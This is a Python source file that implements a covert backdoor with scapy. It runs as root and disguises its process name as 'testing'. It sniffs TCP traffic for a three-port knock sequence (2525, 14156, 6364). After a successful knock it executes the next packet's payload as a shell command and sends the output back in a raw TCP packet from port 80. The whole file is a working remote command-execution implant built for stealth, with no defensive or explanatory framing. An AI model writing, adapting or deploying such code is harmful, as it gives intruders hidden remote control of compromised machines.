import time
import setproctitle
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
CONN_IPS = {}


def verify_root():
    if(os.getuid() != 0):
        exit("This program must be run with root/sudo")


def send_pkt(packet):
    send(packet)


def send_data(destIP, port, data):
    packet = IP(dst=destIP) / TCP(sport=80, dport=port) / Raw(load=data)
    send_pkt(packet)


def run_cmd(packet):
    data = packet['Raw'].load
    arguments = None

    try:
        command, arguments = data.split(' ', 1)
    except ValueError:
        pass

    if(arguments is not None):
        output = Popen([command, arguments], stdout=PIPE).communicate()[0]
    else:
        output = Popen(data, stdout=PIPE).communicate()[0]

    time.sleep(0.1)
    send_data(packet[1].src, packet[2].sport, output)


def port_knock_auth(packet):
    global CONN_IPS
    ip = packet[1].src
    dport = packet[2].dport
    access = [2525, 14156, 6364]
    dc = 4242

    # If the connecting IP has connected before
    if(ip in CONN_IPS):
        auth = CONN_IPS[ip]
        # Connecting IP is already authenticated
        if(auth == 3):
            # Matches first disconnect port
            if(dport == dc):
                del CONN_IPS[ip]
                print("{} has disconnected".format(ip))
                return
            # Else just decode the packet
            run_cmd(packet)
            del CONN_IPS[ip]
        # If port is irrelevant
        elif(dport not in access):
            del CONN_IPS[ip]
        # Connecting IP matches second knock
        elif(dport == access[auth]):
            CONN_IPS[ip] += 1
        else:
            # Fail-safe
            del CONN_IPS[ip]
    elif(dport == access[0]):
        CONN_IPS[ip] = 1


def main():
    print("Sniffing for traffic...")
    sniff(filter="tcp", prn=port_knock_auth)


if __name__ == '__main__':
    verify_root()
    setproctitle.setproctitle("testing")
    try:
        main()
    except KeyboardInterrupt:
        exit("Ctrl+C received. Exiting...")
